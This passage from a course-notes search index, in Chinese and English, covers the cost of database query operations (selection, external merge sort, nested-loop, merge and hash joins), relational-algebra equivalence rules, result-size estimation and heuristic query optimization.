\u6b21\u8bfb\u51fa\u548c\u5199\u5165\uff0c\u6b64\u5904\u5171\u7ecf\u5386 \\(\\lceil \\log_{M-1}{(b_r/M)} \\rceil\\) \u8f6e\u6392\u5e8f\uff0c\u6700\u540e\u4e00\u8f6e\u4e0d\u7528\u5199\u5165\uff0c\u6545\u4e00\u5171\u4e3a \\(\\lceil b_r/b_b\\rceil(2\\lceil \\log_{M-1}{(b_r/M)} \\rceil -1)\\) \u6b21seek \u603b\u8ba1\u4e3a \\(2\\lceil b_r/M \\rceil + \\lceil b_r/b_b\\rceil(2\\lceil \\log_{M-1}{(b_r/M)} \\rceil -1)\\) Join (1) Nested-Loop Join \\(r\\bowtie_\\theta s\\) \uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a for each tuple tr in r do begin for each tuple ts in s do begin test pair (tr, ts) to see if they satisfy the join condition if they do, add tr\u00b7ts to the result end end \u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09 block transfers: \\(b_r+n_r*b_s\\) r\u5171\u8981\u8f7d\u5165 \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981\u8f7d\u5165 \\(n_r*b_s\\) \u6b21 seek times: \\(b_r+n_r\\) r\u5171\u8981seek \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981seek \\(n_r\\) \u6b21 \u6700\u597d\u60c5\u51b5\uff08\u5168\u90e8\u5143\u7ec4\u90fd\u80fd\u76f4\u63a5\u8f7d\u5165\u5185\u5b58\uff09 block transfers \\(b_r + b_s\\) seek times: \\(2\\) (2) Block Nested-Loop Join for each block Br in r do begin for each block Bs in s do begin for each tuple tr in Br do begin for each tuple ts in Bs do begin test pair (tr, ts) to see if they satisfy the join condition if they do, add tr\u00b7ts to the result end end end end \u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09 block transfers: \\(b_r+b_r*b_s\\) r\u5171\u8981\u8f7d\u5165 \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981\u8f7d\u5165 \\(b_r*b_s\\) \u6b21 seek times: \\(2b_r\\) r\u5171\u8981seek \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981seek \\(b_r\\) \u6b21 \u6700\u597d\u60c5\u51b5\uff08\u5168\u90e8\u5143\u7ec4\u90fd\u80fd\u76f4\u63a5\u8f7d\u5165\u5185\u5b58\uff09 block transfers \\(b_r + b_s\\) seek times: \\(2\\) (3) Indexed Nested-Loop Join \u539f\u7406\uff1a\u5916\u5c42\u904d\u5386tuple(\u6bcf\u6b21\u8bfb\u53d6\u4e00\u4e2ablock)\uff0c\u5185\u5c42\u4f7f\u7528\u7d22\u5f15\u5339\u914d\uff08\u5982B+\u6811\u7d22\u5f15\u7b49\uff09 \u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09 \u56e0\u4e3a\u7d22\u5f15\u672c\u8eab\u7684\u590d\u6742\u5ea6\u8f83\u590d\u6742\uff0c\u6545\u53ea\u7ed9\u51fa\u8f83\u7c97\u7565\u7684\u4f30\u7b97 \\(b_r*(t_T+t_S)+n_r*c\\) \u5176\u4e2d \\(c\\) \u6307\u5355\u6b21\u67e5\u8be2\u7684\u5e73\u5747\u5f00\u9500 (4) Merge-Join \u7b97\u6cd5\u6d41\u7a0b \u6839\u636eindex\u7684attributes\u8fdb\u884c\u6392\u5e8f \u8fde\u63a5\u4e24\u4e2a\u6392\u5e8f\u8fc7\u7684\u8868\uff08\u4ece\u5934\u5230\u5c3e\u626b\u63cf\uff09 \u7406\u60f3\u60c5\u51b5\u4e0b\uff08\u6bcf\u4e2a\u5757\u53ea\u9700\u8981\u8bfb\u8fdb\u5185\u5b58\u4e00\u6b21\uff09 block transfers: \\(b_r + b_s\\) +(\u6392\u5e8f) seek times: \\(\\lceil b_r/b_b\\rceil + \\lceil b_s/b_b\\rceil\\) +(\u6392\u5e8f) (5) Hash-Join \u5927\u81f4\u6d41\u7a0b\u5982\u4e0b \u5c06r\u5212\u5206\u6210nh\u4e2a\u5757 \u5c06s\u5212\u5206\u6210nh\u4e2a\u5757 for 0 to nh-1 \u5bf9r\u5bf9\u5e94\u5757\u4e2d\u7684\u5143\u7d20\u5efa\u7acb\u7d22\u5f15Ri for \u904d\u5386s\u5bf9\u5e94\u5757\u4e2d\u7684\u5143\u7d20 \u68c0\u7d22\u7d22\u5f15Ri for \u6240\u6709\u5339\u914d\u7684tuple in r join end end end \u5047\u8bber,s\u5206\u522b\u88ab\u5212\u5206\u4e86 \\(n_r,n_s\\) \u4e2a\u5757\uff0c\u4f46\u5f53 \\(n_r,n_s>M\\) \u8d85\u8fc7\u5185\u5b58\u7684\u5bb9\u7eb3\u7a7a\u95f4\u65f6\uff0c\u5219\u9700\u8981\u8fdb\u884c\u9012\u5f52\u5212\u5206\u3002 \u82e5\u6ca1\u6709\u9012\u5f52\u5212\u5206 block transfer: \\(3(b_r+b_s)+4n_h\\) \u5212\u5206\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u5305\u542b\u8bfb\u51fa\u548c\u5199\u56de \\(2*(b_r+b_s)\\) \u5339\u914d\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u53ea\u5305\u542b\u8bfb\u51fa \\(b_r+b_s\\) \u4f46\u662f\u82e5Hash\u8868\u975e\u6ee1\uff0c\u5219\u81f3\u591a\u5236\u9020\u51fa \\(n_h\\) \u4e2a\u975e\u6ee1\u5757\uff0c\u6d89\u53ca\u5212\u5206\u7684\u5199\u56de\u548c\u5339\u914d\u7684\u8bfb\u51fa\uff0c\u4f5c\u7528\u4e8e\u4e24\u4e2a\u8868\uff0c\u6545\u5171 \\(4n_h\\) (\u5b9e\u9645\u4e2d \\(n_h\\) \u4e00\u822c\u5f88\u5c0f\uff0c\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1) seek times: \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)+2n_h\\) \u5212\u5206\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u5047\u8bbe\u6bcf\u6b21\u653e\u5165\u5185\u5b58\u5757\u4e2d \\(b_b\\) \u4e2a\uff0c\u5219\u8bfb\u51fa\u5199\u56de\u5171\u9700 \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)\\) \u6b21 \u5339\u914d\u8fc7\u7a0b\u4e2d\u76f4\u63a5\u53d6Hash\u5757\uff0c\u5171 \\(2n_h\\) \u82e5\u6709\u9012\u5f52\u5212\u5206 \u9012\u5f52\u5212\u5206\u7684\u539f\u5219\u662f\uff0c\u6bcf\u6b21\u5c06\u5212\u5206\u7684\u5927\u5c0f\u964d\u4e3a\u539f\u6765\u7684 \\(M-1\\) \uff0c\u76f4\u81f3\u6bcf\u4e2a\u5212\u5206\u7684\u6700\u591a\u5360 \\(M\\) \u5757\u4e3a\u6b62\uff08\u4f7f\u5f97\u5185\u5b58\u80fd\u591f\u5bb9\u7eb3\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u5efa\u7acb\u7d22\u5f15\uff09 block transfer: \\(2(b_r+b_s)\\lceil log_{M-1}(b_s)-1\\rceil+b_r+b_s\\) \u5171\u8fdb\u884c \\(\\lceil log_{M-1}(b_s)-1\\rceil\\) \u8f6e \u5176\u4f59\u53c2\u7167\u6ca1\u6709\u9012\u5f52\u5212\u5206\u7684\u60c5\u51b5 seek times: \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)\\lceil log_{M-1}(b_s)-1\\rceil+2n_h\\) \u5171\u8fdb\u884c \\(\\lceil log_{M-1}(b_s)-1\\rceil\\) \u8f6e \u5176\u4f59\u53c2\u7167\u6ca1\u6709\u9012\u5f52\u5212\u5206\u7684\u60c5\u51b5 Evaluation \u5bf9\u4e00\u4e9b\u5355\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\u6709\u4e86\u89e3\u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u7269\u5316(Materialization)\u548c\u6d41\u6c34(pipelining)\u7684\u65b9\u6cd5\u5c06\u4ed6\u4eec\u4e32\u8d77\u6765 \u5b9e\u4f53\u5316\uff1a\u4f9d\u6b21\u8fdb\u884c\u8868\u8fbe\u5f0f\u7684\u8ba1\u7b97\uff0c\u6784\u5efa\u524d\u7f00\u6811\u9012\u5f52\u8fdb\u884c \u6d41\u6c34\u7ebf\uff1a\u540c\u65f6\u8bc4\u4f30\u591a\u4e2a\u64cd\u4f5c Optimization Equivalence Rule(\u7b49\u4ef7\u5173\u7cfb\u8868\u8fbe\u5f0f) Conjunctive selection operations can be deconstructed into a sequence of indicidual selections \\(\\sigma_{\\theta_1\\land\\theta_2}(E)=\\sigma_{\\theta_1}(\\sigma_{\\theta_2}(E))\\) Selection operations are commutative \\(\\sigma_{\\theta_1}(\\sigma_{\\theta_2}(E)) = \\sigma_{\\theta_2}(\\sigma_{\\theta_1}(E))\\) Only the last in a sequence of projection operations is needed, the others can be ommitted. \\(\\Pi_{L_1}(\\Pi_{L_2}(...(\\Pi_{L_n}(E))...))=\\Pi_{L_1}(E)\\) Selections can be combined with Cartesian products and theta joins. (1) \\(\\sigma_{\\theta}(E_1\\times E_2) = E_1 \\bowtie_\\theta E_2\\) (2) \\(\\sigma_{\\theta_1}(E_1\\bowtie_{\\theta_2} E_2)=E_1\\bowtie_{\\theta_1\\land\\theta_2}E_2\\) Theta-join operations (and natural joins) are commutative. \\(E_1\\bowtie_\\theta E_2 = E_2\\bowtie_\\theta E_1\\) Natural join operatins are associative \\((E_1\\bowtie E_2)\\bowtie E_3 = E_1\\bowtie(E_2\\bowtie E_3)\\) , Theta joins are associative in the following manner \\((E_1\\bowtie_{\\theta_1} E_2)\\bowtie_{\\theta_2\\land\\theta_3} E_3 = E_1\\bowtie_{\\theta_1\\land \\theta_3}(E_2\\bowtie_{\\theta_2} E_3)\\) , where \\(theta_2\\) involves attributes from only \\(E_2\\) and \\(E_3\\) . The selection operation distributes over the theta join operation under the following two conditions: (1) When all the attributes in \\(\\theta_0\\) involve only the attributes of one of the expressions ( \\(E_1\\) ) being joined \\(\\sigma_{\\theta_0}(E_1\\bowtie_{\\theta}E_2)=(\\sigma_{\\theta_0}(E_1))\\bowtie_\\theta E_2\\) (2) When \\(\\theta_1\\) involves only the attributes of \\(E_1\\) and \\(\\theta_2\\) involves only the attributes of \\(E_2\\) . \\(\\sigma_{\\theta_1\\land \\theta_2}(E_1\\bowtie_{\\theta}E_2)=(\\sigma_{\\theta_1}(E_1))\\bowtie_{\\theta}(\\sigma_{\\theta_2}(E_2))\\) The projetion operation distributes over the theta join operation as follows: (1) if \\(\\theta\\) involves only attributes from \\(L_1 \\cup L2\\) : \\(\\Pi_{L1\\cup L_2}(E_1\\bowtie_{\\theta}E_2)=(\\Pi_{L_1}(E_1))\\bowtie_{\\theta}(\\Pi_{L_2}(E_2))\\) (2) Consider a join \\(E_1\\bowtie_\\theta E_2\\) . (3) Let \\(L_1\\) and \\(L_2\\) be sets of attributes from \\(E_1\\) and \\(E_2\\) respectively (4) Let \\(L_3\\) be attributes of \\(E_1\\) that are involved in join condition \\(\\theta\\) , but are not in \\(L_1 \\cup L_2\\) (5) Let \\(L_4\\) be attributes of \\(E_2\\) that are involved in join condition \\(\\theta\\) , but are not in \\(L_1\\cup L_2\\) \\(\\Pi_{L_1\\cup L_2}(E_1\\bowtie_\\theta E_2)=\\Pi_{L_1\\cup L_2}((\\Pi_{L_1\\cup L_3}(E_1))\\bowtie_\\theta(\\Pi_{L2\\cup L_4}(E_2)))\\) The set operations union and intersection are commutative \\(E_1 \\cup E_2 = E_2 \\cup E_1\\) , \\(E_1\\cap E_2 = E_2 \\cap E_1\\) Set union and intersection are assocative \\((E_1\\cup E_2)\\cup E_3 = E_1 \\cup (E_2\\cup E_3)\\) , \\((E_1\\cap E_2)\\cap E_3=E_1\\cap(E_2\\cap E_3)\\) The selection operation distributes over \\(\\cap\\) , \\(\\cup\\) and \\(-\\) \\(\\sigma_\\theta(E_1-E_2)=\\sigma_\\theta(E_1)-\\sigma_\\theta(E_2)\\) The projection operation distributes over union \\(\\Pi_{L}(E_1\\cup E_2)=(\\Pi_L(E_1))\\cup (\\Pi_{L}(E_2))\\) Cost Estimation(\u7ed3\u679c\u96c6\u5927\u5c0f\u4f30\u8ba1) \u57fa\u672c\u6982\u5ff5 \\(n_r\\) : number of tuples in a relation \\(r\\) \\(b_r\\) : number of blocks containing tuples of \\(r\\) \\(l_r\\) : size of a tuple of \\(r\\) \\(f_r\\) : blocking factor of \\(r\\) \\(V(A,r)\\) : number of distinct values that appear in \\(r\\) for attribute \\(A\\) ; same as the size of \\(\\Pi_A(r)\\) \\(b_r=\\lceil \\frac{n_r}{f_r} \\rceil\\) \u7b97\u6cd5\u4f30\u8ba1 \u9009\u62e9\u4f30\u8ba1 \\(\\sigma_{A=v}(r)\\) \u4e00\u822c\u5047\u8bbe\u4e3a\u5747\u5300\u5206\u5e03 \\(n_r/V(A,r)\\) \u590d\u6742\u9009\u62e9\u4f30\u8ba1 \u5408\u53d6 \\(\\sigma_{\\theta_1\\land \\theta_2\\land\\dots\\land\\theta_n(r)}\\) : \\(n_r\\cdot\\frac{s_1\\cdot s_2\\dots s_n}{n_r^n}\\) \u6790\u53d6 \\(\\sigma_{\\theta_1\\lor \\theta_2\\lor\\dots\\lor\\theta_n(r)}\\) : \\(n_r\\cdot(1-(1-\\frac{s_1}{n_r})(1-\\frac{s_2}{n_r})\\dots(1-\\frac{s_n}{n_r}))\\) \u8fde\u63a5\u4f30\u8ba1 \\(r\\bowtie s\\) \u82e5\u4e24\u4e2a\u5173\u7cfb\u65e0\u5171\u540c\u5c5e\u6027: \\(n_r \u00b7 n_s\\) \u82e5\u5171\u540c\u5c5e\u6027\u662fr\u7684key: \\({\\rm size} \\le n_s\\) \u82e5\u5171\u540c\u5c5e\u6027\u662fs\u5230r\u7684foregin key: \\(n_s\\) \u82e5\u5171\u540c\u5c5e\u6027\u4e0d\u662fkey: \\(\\min(\\frac{n_s\\cdot n_r}{V(A,s)}, \\frac{n_s\\cdot n_r}{V(A,r)})\\) \u6295\u5f71: \\(\\Pi(s)\\) : \\(V(A,r)\\) \u805a\u5408: \\(\\mathcal{G}(s)\\) : \\(V(A,r)\\) \u96c6\u5408\uff1a\u8f6c\u6362\u4e3a\u5408\u53d6\u548c\u6790\u53d6 Heuristic Optimization \u63a2\u7d22\u5f0f\u7684\u4f18\u5316 \u5c3d\u65e9\u8fdb\u884cselection \u5c3d\u65e9\u8fdb\u884cprojection \u9009\u62e9\u6700\u4e25\u683c\u7684selection\u548coperations\u64cd\u4f5c","title":"Query Processing & Optimization"},{"location":"course/db/query/#query-processing-optimization","text":"\u67e5\u8be2\u5904\u7406\u5171\u5206\u4e3a\u4e09\u4e2a\u8fc7\u7a0b\uff1a\u6267\u884c(Parsing & Translation)\u3001\u4f18\u5316(Optimization)\u3001\u4f30\u8ba1(Evaluation)","title":"Query Processing &amp; Optimization"},{"location":"course/db/query/#parsing-translation","text":"","title":"Parsing &amp; Translation"},{"location":"course/db/query/#measures-of-query-cost","text":"\\(t_T\\) : time to transfer one block \\(t_S\\) : time for one seek Cost for b block transfers plus S seeks: \\(b*t_T + S*t_S\\)","title":"Measures of Query Cost"},{"location":"course/db/query/#selection","text":"Linear Search(equality on key): \u7ebf\u6027\u641c\u7d22 worst cost: \\(b_r * t_T + t_S\\) (\u5173\u7cfb\u8868\u5b58\u653e\u5728 \\(b_r\\) \u4e2ablock\u4e2d) average cost: \\((b_r/2)*t_T + t_S\\) (\u5728\u67e5\u8be2\u503c\u4e3a\u4e3b\u7801\u7684\u60c5\u51b5\u4e0b) Primary B+-Tree index(equality on key): B+\u6811\u4e3b\u7d22\u5f15\u641c\u7d22 Cost: \\((h_i+1)*(t_T+t_S)\\) \uff0c \\(h_i\\) \u662fB+\u6811\u7684\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u9700\u8981\u4eceDisk\u4e2dSeek\u8be5\u5757\u5e76\u8bfb\u5165\uff0c\u800c\u540e\u9762\u76841\u662f\u6307\u6700\u540e\u627e\u5230\u76ee\u6807\u5757\u65f6\uff0c\u9700\u8981\u8fdb\u884cseek+transfer(\u4f7f\u7528Index\u5fc5\u4e0d\u53ef\u5c11\u7684) Primary B+-Tree index(equality on nonkey): B+\u6811\u4e3b\u7d22\u5f15\uff0c\u5355\u503c(\u975e\u552f\u4e00) Cost: \\(h_i*(t_T+t_S)+t_S+b*t_T\\) \uff0c\u5176\u4e2db\u662f\u5305\u542b\u67e5\u627e\u503c\u7684\u6570\u636e\u5757\u4e2a\u6570\u3002 Secondary B+-Tree index(equality on key): B+\u6811\u8f85\u52a9\u7d22\u5f15 Cost: \\((h_i+1)*(t_T+t_S)\\) \uff0c\u548cB+\u6811\u4e3b\u7d22\u5f15\u641c\u7d22\u539f\u7406\u4e00\u6837 Secondary B+-index on nonkey: B+\u6811\u8f85\u52a9\u7d22\u5f15\uff0c\u5355\u503cv(\u975e\u552f\u4e00) Cost: \\((h_i + m+ n) * (t_T + t_S)\\) m\u6307B+\u6811\u4e2d\uff0c\u5bf9\u5e94\u67e5\u627e\u503cv\u7d22\u5f15\u7684\u5757\u7684\u6570\u91cf n\u6307\u5305\u542b\u67e5\u627e\u503cv\u7684\u6570\u636e\u5757\u7684\u6570\u91cf","title":"Selection"},{"location":"course/db/query/#external-merge-sort","text":"M: memory size\uff0c\u5185\u5b58\u5171\u53ef\u5b58\u653e\u7684\u9875\u7684\u4e2a\u6570 \u5927\u81f4\u6d41\u7a0b\u53ef\u4ee5\u901a\u8fc7\u4e0b\u56fe\u8868\u793a\uff1a \u7b2c\u4e00\u8f6e\u4f20\u5165M\u5757\u6570\u636e\uff0c\u8fdb\u884c\u539f\u5730\u6392\u5e8f\u3002\uff08\u4f7f\u7528\u5feb\u6392\u3001\u5806\u6392\u5e8f\u7b49\u539f\u5730\u6392\u5e8f\u7b97\u6cd5\uff09 \u7b2c\u4e8c\u8f6e\u53ca\u540e\u9762\u6bcf\u8f6e\uff0c\u5408\u5e76M-1\u4e2a\u6709\u5e8f\u5e8f\u5217\u3002 \u6ce8\u610f\uff0c\u9700\u8981\u5728memory\u5757\u4e2d\u9884\u7559\u4e00\u4e2a\u533a\u57df\u5b58\u653e\u6392\u5e8f\u597d\u7684\u6709\u5e8f\u5e8f\u5217\uff0c\u6240\u4ee5\u6bcf\u8f6e\u5408\u5e76\u540e\uff0c\u6709\u5e8f\u5e8f\u5217\u7684\u6bb5\u6570\u5c31\u5c11\u4e86M-1\u500d\uff08\u9884\u7559\u51fa\u4e00\u4e2a\u8f93\u51fa\u5757\u7684\u539f\u56e0\u662f\uff1a\u53ef\u4ee5\u4ee5\u5757\u4e3a\u5355\u4f4d\u5199\u56de\uff0c\u8282\u7701\u65f6\u95f4\u5f00\u9500\uff09 block transfers Total number of merge passes required: \\(\\lceil \\log_{M-1}(b_r/M)\\rceil\\) (\u7b2c\u4e00\u6b21\u6392\u5e8f\u88ab\u89c6\u4e3a\u521d\u59cb\u5316\uff0c\u4e0d\u8ba1\u5165\u5176\u4e2d\uff0c\u53ef\u5e26\u5165\u68c0\u9a8c \\(b_r=M\\) \u548c \\(b_r=M-1\\) \u7684\u60c5\u51b5) \u56e0\u4e3a\u5728\u4e00\u8f6e\u5f52\u5e76\u6392\u5e8f\u4e2d\uff0c\u4e00\u4e2a\u5757\u9700\u8981\u7ecf\u5386\u5199\u5165\u5185\u5b58\u3001\u7136\u540e\u5199\u56de\u78c1\u76d8\uff0c\u6240\u4ee5\u6bcf\u8f6e\u7684\u5f00\u9500\u662f \\(2b_r\\) \u6700\u540e\u4e00\u8f6e\u6392\u5e8f\uff0c\u4e0d\u8ba1\u7b97\u5199\u56dedisk\u7684\u5f00\u9500\u3002 \u6240\u4ee5\u603b\u6b21\u6570\u662f \\(b_r(2\\lceil \\log_{M-1}(b_r/M)\\rceil + 1)\\) seek times \u7b2c\u4e00\u6b21\u6392\u5e8f\uff1a \\(\\lceil b_r/M\\rceil\\) \u6b21seek \u7b2c\u4e8c\u6b21\u6392\u5e8f\u53ca\u540e\u9762\u7684\u6392\u5e8f\uff1a\u5047\u8bbe\u6bcf\u6b21\u8bfb\u5165/\u5199\u51fa\u7684\u5757\u6570\u4e3a \\(\\lceil b_b \\rceil\\) \u5219\u9700\u8981 \\(\\lceil b_r/b_b\\rceil\\) \u6b21\u8bfb\u51fa\u548c\u5199\u5165\uff0c\u6b64\u5904\u5171\u7ecf\u5386 \\(\\lceil \\log_{M-1}{(b_r/M)} \\rceil\\) \u8f6e\u6392\u5e8f\uff0c\u6700\u540e\u4e00\u8f6e\u4e0d\u7528\u5199\u5165\uff0c\u6545\u4e00\u5171\u4e3a \\(\\lceil b_r/b_b\\rceil(2\\lceil \\log_{M-1}{(b_r/M)} \\rceil -1)\\) \u6b21seek \u603b\u8ba1\u4e3a \\(2\\lceil b_r/M \\rceil + \\lceil b_r/b_b\\rceil(2\\lceil \\log_{M-1}{(b_r/M)} \\rceil -1)\\)","title":"External Merge Sort"},{"location":"course/db/query/#join","text":"(1) Nested-Loop Join \\(r\\bowtie_\\theta s\\) \uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a for each tuple tr in r do begin for each tuple ts in s do begin test pair (tr, ts) to see if they satisfy the join condition if they do, add tr\u00b7ts to the result end end \u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09 block transfers: \\(b_r+n_r*b_s\\) r\u5171\u8981\u8f7d\u5165 \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981\u8f7d\u5165 \\(n_r*b_s\\) \u6b21 seek times: \\(b_r+n_r\\) r\u5171\u8981seek \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981seek \\(n_r\\) \u6b21 \u6700\u597d\u60c5\u51b5\uff08\u5168\u90e8\u5143\u7ec4\u90fd\u80fd\u76f4\u63a5\u8f7d\u5165\u5185\u5b58\uff09 block transfers \\(b_r + b_s\\) seek times: \\(2\\) (2) Block Nested-Loop Join for each block Br in r do begin for each block Bs in s do begin for each tuple tr in Br do begin for each tuple ts in Bs do begin test pair (tr, ts) to see if they satisfy the join condition if they do, add tr\u00b7ts to the result end end end end \u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09 block transfers: \\(b_r+b_r*b_s\\) r\u5171\u8981\u8f7d\u5165 \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981\u8f7d\u5165 \\(b_r*b_s\\) \u6b21 seek times: \\(2b_r\\) r\u5171\u8981seek \\(b_r\\) \u6b21\uff0c\u800cs\u5171\u8981seek \\(b_r\\) \u6b21 \u6700\u597d\u60c5\u51b5\uff08\u5168\u90e8\u5143\u7ec4\u90fd\u80fd\u76f4\u63a5\u8f7d\u5165\u5185\u5b58\uff09 block transfers \\(b_r + b_s\\) seek times: \\(2\\) (3) Indexed Nested-Loop Join \u539f\u7406\uff1a\u5916\u5c42\u904d\u5386tuple(\u6bcf\u6b21\u8bfb\u53d6\u4e00\u4e2ablock)\uff0c\u5185\u5c42\u4f7f\u7528\u7d22\u5f15\u5339\u914d\uff08\u5982B+\u6811\u7d22\u5f15\u7b49\uff09 \u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09 \u56e0\u4e3a\u7d22\u5f15\u672c\u8eab\u7684\u590d\u6742\u5ea6\u8f83\u590d\u6742\uff0c\u6545\u53ea\u7ed9\u51fa\u8f83\u7c97\u7565\u7684\u4f30\u7b97 \\(b_r*(t_T+t_S)+n_r*c\\) \u5176\u4e2d \\(c\\) \u6307\u5355\u6b21\u67e5\u8be2\u7684\u5e73\u5747\u5f00\u9500 (4) Merge-Join \u7b97\u6cd5\u6d41\u7a0b \u6839\u636eindex\u7684attributes\u8fdb\u884c\u6392\u5e8f \u8fde\u63a5\u4e24\u4e2a\u6392\u5e8f\u8fc7\u7684\u8868\uff08\u4ece\u5934\u5230\u5c3e\u626b\u63cf\uff09 \u7406\u60f3\u60c5\u51b5\u4e0b\uff08\u6bcf\u4e2a\u5757\u53ea\u9700\u8981\u8bfb\u8fdb\u5185\u5b58\u4e00\u6b21\uff09 block transfers: \\(b_r + b_s\\) +(\u6392\u5e8f) seek times: \\(\\lceil b_r/b_b\\rceil + \\lceil b_s/b_b\\rceil\\) +(\u6392\u5e8f) (5) Hash-Join \u5927\u81f4\u6d41\u7a0b\u5982\u4e0b \u5c06r\u5212\u5206\u6210nh\u4e2a\u5757 \u5c06s\u5212\u5206\u6210nh\u4e2a\u5757 for 0 to nh-1 \u5bf9r\u5bf9\u5e94\u5757\u4e2d\u7684\u5143\u7d20\u5efa\u7acb\u7d22\u5f15Ri for \u904d\u5386s\u5bf9\u5e94\u5757\u4e2d\u7684\u5143\u7d20 \u68c0\u7d22\u7d22\u5f15Ri for \u6240\u6709\u5339\u914d\u7684tuple in r join end end end \u5047\u8bber,s\u5206\u522b\u88ab\u5212\u5206\u4e86 \\(n_r,n_s\\) \u4e2a\u5757\uff0c\u4f46\u5f53 \\(n_r,n_s>M\\) \u8d85\u8fc7\u5185\u5b58\u7684\u5bb9\u7eb3\u7a7a\u95f4\u65f6\uff0c\u5219\u9700\u8981\u8fdb\u884c\u9012\u5f52\u5212\u5206\u3002 \u82e5\u6ca1\u6709\u9012\u5f52\u5212\u5206 block transfer: \\(3(b_r+b_s)+4n_h\\) \u5212\u5206\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u5305\u542b\u8bfb\u51fa\u548c\u5199\u56de \\(2*(b_r+b_s)\\) \u5339\u914d\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u53ea\u5305\u542b\u8bfb\u51fa \\(b_r+b_s\\) \u4f46\u662f\u82e5Hash\u8868\u975e\u6ee1\uff0c\u5219\u81f3\u591a\u5236\u9020\u51fa \\(n_h\\) \u4e2a\u975e\u6ee1\u5757\uff0c\u6d89\u53ca\u5212\u5206\u7684\u5199\u56de\u548c\u5339\u914d\u7684\u8bfb\u51fa\uff0c\u4f5c\u7528\u4e8e\u4e24\u4e2a\u8868\uff0c\u6545\u5171 \\(4n_h\\) (\u5b9e\u9645\u4e2d \\(n_h\\) \u4e00\u822c\u5f88\u5c0f\uff0c\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1) seek times: \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)+2n_h\\) \u5212\u5206\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u5047\u8bbe\u6bcf\u6b21\u653e\u5165\u5185\u5b58\u5757\u4e2d \\(b_b\\) \u4e2a\uff0c\u5219\u8bfb\u51fa\u5199\u56de\u5171\u9700 \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)\\) \u6b21 \u5339\u914d\u8fc7\u7a0b\u4e2d\u76f4\u63a5\u53d6Hash\u5757\uff0c\u5171 \\(2n_h\\) \u82e5\u6709\u9012\u5f52\u5212\u5206 \u9012\u5f52\u5212\u5206\u7684\u539f\u5219\u662f\uff0c\u6bcf\u6b21\u5c06\u5212\u5206\u7684\u5927\u5c0f\u964d\u4e3a\u539f\u6765\u7684 \\(M-1\\) \uff0c\u76f4\u81f3\u6bcf\u4e2a\u5212\u5206\u7684\u6700\u591a\u5360 \\(M\\) \u5757\u4e3a\u6b62\uff08\u4f7f\u5f97\u5185\u5b58\u80fd\u591f\u5bb9\u7eb3\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u5efa\u7acb\u7d22\u5f15\uff09 block transfer: \\(2(b_r+b_s)\\lceil log_{M-1}(b_s)-1\\rceil+b_r+b_s\\) \u5171\u8fdb\u884c \\(\\lceil log_{M-1}(b_s)-1\\rceil\\) \u8f6e \u5176\u4f59\u53c2\u7167\u6ca1\u6709\u9012\u5f52\u5212\u5206\u7684\u60c5\u51b5 seek times: \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)\\lceil log_{M-1}(b_s)-1\\rceil+2n_h\\) \u5171\u8fdb\u884c \\(\\lceil log_{M-1}(b_s)-1\\rceil\\) \u8f6e \u5176\u4f59\u53c2\u7167\u6ca1\u6709\u9012\u5f52\u5212\u5206\u7684\u60c5\u51b5","title":"Join"},{"location":"course/db/query/#evaluation","text":"\u5bf9\u4e00\u4e9b\u5355\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\u6709\u4e86\u89e3\u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u7269\u5316(Materialization)\u548c\u6d41\u6c34(pipelining)\u7684\u65b9\u6cd5\u5c06\u4ed6\u4eec\u4e32\u8d77\u6765 \u5b9e\u4f53\u5316\uff1a\u4f9d\u6b21\u8fdb\u884c\u8868\u8fbe\u5f0f\u7684\u8ba1\u7b97\uff0c\u6784\u5efa\u524d\u7f00\u6811\u9012\u5f52\u8fdb\u884c 